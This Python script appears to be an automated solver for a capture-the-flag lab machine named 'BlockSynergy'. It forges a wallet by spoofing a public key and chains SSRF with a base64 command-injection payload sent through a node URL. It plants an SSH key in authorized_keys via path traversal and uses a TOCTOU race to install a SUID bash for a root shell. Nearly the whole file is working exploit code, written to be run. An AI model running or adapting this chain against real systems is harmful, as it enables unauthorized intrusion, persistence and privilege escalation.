#!/usr/bin/env python3
import requests
import re
import base64
import json
import html
import subprocess
import os
import sys
import time
from urllib.parse import urlencode

# --- CONFIGURATION ---
# Created By Prakhar Agarwal from India
TARGET_IP = "10.x.x.x"    # Replace with your target IP
VPN_TUN_IP = "10.x.x.x"    # Replace with your VPN IP
BASE_URL = f"http://{TARGET_IP}:8080"
SSH_KEY_FILE = "blocksynergy_hank_key"

# --- HELPER FUNCTIONS ---
def run_ssh(command, timeout=30):
    """Runs a command over SSH as Hank and returns the output."""
    ssh_cmd = [
        "ssh",
        "-i", SSH_KEY_FILE,
        "-o", "IdentitiesOnly=yes",
        "-o", "StrictHostKeyChecking=no",
        f"hank@{TARGET_IP}",
        command
    ]
    try:
        result = subprocess.run(ssh_cmd, capture_output=True, text=True, timeout=timeout)
        if result.returncode != 0 and result.stderr:
            err = [line for line in result.stderr.strip().split('\n') if "Warning: Permanently added" not in line]
            if err:
                print(f"[-] SSH Error ({command}): {' '.join(err)}")
        return result.stdout.strip()
    except subprocess.TimeoutExpired:
        print("[-] SSH command timed out")
        return ""

# --- PHASE 2: FORGE VIP WALLET ---
def forge_vip_wallet(session):
    print("[*] Forging VIP wallet...")
    resp = session.post(f"{BASE_URL}/dashboard/wallet", data={"action": "create", "filename": "fresh"}, timeout=20)
    resp.raise_for_status()
    fresh_wallet = resp.json()

    chain = session.get(f"{BASE_URL}/blockchain", timeout=20).json()
    balances = {}
    for block in chain:
        for tx in block.get("data", []):
            if not isinstance(tx, dict) or "amount" not in tx:
                continue
            amount = int(tx["amount"])
            sender = tx.get("sender")
            receiver = tx.get("receiver")
            if receiver:
                balances[receiver] = balances.get(receiver, 0) + amount
            if sender and sender != "Blockchain_Reward":
                balances[sender] = balances.get(sender, 0) - amount

    vip_public_key, vip_balance = max(balances.items(), key=lambda item: item[1])
    print(f"[+] Found VIP public key with balance: {vip_balance}")

    forged_wallet = {
        "private_key": fresh_wallet["private_key"],
        "public_key": vip_public_key,
    }
    resp = session.post(
        f"{BASE_URL}/dashboard/wallet",
        data={"action": "load"},
        files={"file": ("forged_wallet.json", json.dumps(forged_wallet), "application/json")},
        timeout=20
    )
    resp.raise_for_status()
    if "Wallet loaded successfully" in resp.text:
        print("[+] VIP wallet loaded successfully.")
    else:
        print("[-] Failed to load VIP wallet.")
        sys.exit(1)

# --- PHASE 3 & 4: SSRF AND COMMAND INJECTION ---
def register_node(session, url):
    resp = session.post(f"{BASE_URL}/dashboard/vip/nodes", data={"action": "register", "node": url}, timeout=20)
    resp.raise_for_status()

def get_last_node_id(session, max_retries=5):
    """Grabs the last testNode ID from the page with retries to handle server lag."""
    for attempt in range(max_retries):
        page = session.get(f"{BASE_URL}/dashboard/vip/nodes", timeout=20).text
        matches = re.findall(r'testNode\(.([0-9]+).\)', page)
        if matches:
            return matches[-1]
        # If not found, wait 0.5 seconds and try again before giving up
        time.sleep(0.5) 
        
    raise Exception("Node ID not found after retries (server may be lagging, run the script again)")

def test_node(session, node_id):
    resp = session.get(f"{BASE_URL}/dashboard/vip/nodes/test_node/{node_id}", timeout=60)
    resp.raise_for_status()
    return resp.text

def execute_as_walter(session, command):
    encoded = base64.b64encode(command.encode()).decode()
    command_node = f"http://foo&echo$IFS''{encoded}|base64$IFS''-d|bash&@{VPN_TUN_IP}:18083/"
    
    register_node(session, command_node)
    internal_action = f"http://0.0.0.0:8080/admin/nodes/manage?{urlencode({'action': 'ping_node', 'target': command_node})}"
    register_node(session, internal_action)
    
    time.sleep(0.5) # Give the server a split second to update the node list
    node_id = get_last_node_id(session)
    body = test_node(session, node_id)
    
    outputs = [
        html.unescape(value).strip()
        for value in re.findall(r"<pre[^>]*>(.*?)</pre>", body, re.S)
        if html.unescape(value).strip()
    ]
    return "\n".join(outputs)

# --- PHASE 6: PATH TRAVERSAL TO HANK ---
def inject_ssh_key(session):
    print("\n[*] Generating SSH keypair...")
    if not os.path.exists(SSH_KEY_FILE):
        subprocess.run(["ssh-keygen", "-t", "ed25519", "-f", SSH_KEY_FILE, "-N", "", "-C", "blocksynergy-writeup"], check=True, capture_output=True)
    
    with open(f"{SSH_KEY_FILE}.pub", "r") as f:
        pub_key = f.read().strip()

    print("[*] Creating malicious contract to inject SSH key...")
    contract = {
        "name": "ssh-bootstrap", "id": 1, "owner": "Developer", "debug": "True",
        "logic": {"mint": "allow"}, "storage": {"balances": {}, "total_supply": 0},
        "hooks": {"on_mint": "log"},
        "__meta__": {
            "log_file": "../../../../home/hank/.ssh/authorized_keys",
            "log_content": {"on_mint": f"\n{pub_key}\n"}
        }
    }
    b64_contract = base64.b64encode(json.dumps(contract).encode()).decode()
    
    print("[*] Writing contract to target via Walter primitive...")
    execute_as_walter(session, f"echo {b64_contract} | base64 -d > /tmp/hank_contract.json")
    
    print("[*] Uploading contract and triggering mint...")
    upload_cmd = """curl -s -c /tmp/hank_contract.jar http://127.0.0.1:5000/dashboard >/dev/null
curl -s -b /tmp/hank_contract.jar -c /tmp/hank_contract.jar -F action=upload_contract -F contract_file=@/tmp/hank_contract.json http://127.0.0.1:5000/dashboard -o /tmp/hank_upload.html
grep -q 'Contract loaded' /tmp/hank_upload.html
curl -s -b /tmp/hank_contract.jar -c /tmp/hank_contract.jar -d action=contract_mint -d contract_mint_amount=1 http://127.0.0.1:5000/dashboard -o /tmp/hank_mint.html"""
    execute_as_walter(session, upload_cmd)
    
    print("[*] Verifying SSH access as Hank...")
    ssh_test = run_ssh("id")
    if "uid=1001(hank)" not in ssh_test:
        print("[-] SSH as Hank failed. Contract injection might have failed.")
        sys.exit(1)
    print(f"[+] SSH access verified: {ssh_test}")

# --- PHASE 7-12: TOCTOU RACE CONDITION ---
def win_race_and_root():
    print("\n[*] Building malicious SUID archive...")
    # Using commas for sed separator to avoid shell quote parsing issues over SSH
    run_ssh("tar --numeric-owner --owner=0 --group=0 --mode=4755 --transform=s,^bash$,opt/blocksynergy/.diag, -czf /home/hank/suid.tar.gz -C /bin bash")
    
    archive_check = run_ssh("tar -tvzf /home/hank/suid.tar.gz")
    print(f"[*] Archive Metadata:\n{archive_check}")
    
    # FIXED validation check: looking for the symbolic SUID permission 'rwsr-xr-x' instead of '4755'
    if "rwsr-xr-x" not in archive_check or "opt/blocksynergy/.diag" not in archive_check:
        print("[-] SUID archive creation failed!")
        sys.exit(1)
    print("[+] SUID archive created successfully.")

    print("[*] Writing race condition script...")
    win_sh = """#!/bin/bash
set -u
F=/var/restore_work/_opt_blocksynergy.tar.gz
TMP=/var/restore_work/.swp
PAYLOAD=/home/hank/suid.tar.gz
DIAG=/opt/blocksynergy/.diag
LOG=/home/hank/win.log
END=$((SECONDS + 80))
SWAPPED=0
echo "ARMED" > "$LOG"
while [ "$SECONDS" -lt "$END" ]; do
  if [ -f "$F" ] && [ "$SWAPPED" -eq 0 ]; then
    SIZE=$(stat -c %s "$F" 2>/dev/null || echo 0)
    if [ "$SIZE" -gt 10000000 ]; then
      cp "$PAYLOAD" "$TMP" 2>/dev/null
      if mv -fT "$TMP" "$F" 2>/dev/null; then
        echo "SWAPPED size=$SIZE" >> "$LOG"
        SWAPPED=1
      fi
    fi
  fi
  if [ -f "$DIAG" ]; then
    OWNER=$(stat -c %U:%G "$DIAG")
    MODE=$(stat -c %a "$DIAG")
    if [ "$OWNER" = "root:root" ] && [ "$MODE" = "4755" ]; then
      stat -c 'READY owner=%U:%G mode=%a size=%s' "$DIAG" >> "$LOG"
      echo "DIAG_READY" >> "$LOG"
      exit 0
    fi
  fi
  sleep 0.02
done
echo "TIMEOUT swapped=$SWAPPED" >> "$LOG"
exit 1
"""
    b64_win = base64.b64encode(win_sh.encode()).decode()
    run_ssh(f"echo {b64_win} | base64 -d > /home/hank/win.sh")
    run_ssh("chmod 700 /home/hank/win.sh")

    print("[*] Starting race script in background and triggering restore...")
    run_ssh("nohup /home/hank/win.sh >/dev/null 2>&1 </dev/null &")
    run_ssh("touch /opt/blocksynergy/restore")

    print("[*] Waiting for the TOCTOU race to be won (up to 90 seconds)...")
    time.sleep(90)

    log_output = run_ssh("cat /home/hank/win.log")
    print(f"[*] Race log:\n{log_output}")

    if "DIAG_READY" in log_output:
        print("\n[+] Race won! Executing SUID bash for root shell...")
        print("---------------------------------------------------")
        print("Dropping into interactive root shell. Type 'exit' to quit.")
        print("---------------------------------------------------")
        os.execvp("ssh", [
            "ssh", "-i", SSH_KEY_FILE,
            "-o", "IdentitiesOnly=yes",
            "-o", "StrictHostKeyChecking=no",
            f"hank@{TARGET_IP}",
            "/opt/blocksynergy/.diag -p -c 'cat /root/root.txt; exec bash -p'"
        ])
    else:
        print("[-] Race failed or timed out. Try running the script again.")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    print("=== BlockSynergy Automation Script ===")
    print(f"Target: {TARGET_IP}")
    print(f"VPN IP: {VPN_TUN_IP}")
    
    session = requests.Session()
    session.headers["User-Agent"] = "Mozilla/5.0"
    
    try:
        forge_vip_wallet(session)
        print("\n[*] Testing command execution as Walter...")
        out = execute_as_walter(session, "id; cat /home/walter/user.txt")
        print(f"[+] Walter output:\n{out}")
        
        inject_ssh_key(session)
        win_race_and_root()
        
    except Exception as e:
        print(f"\n[-] An error occurred: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
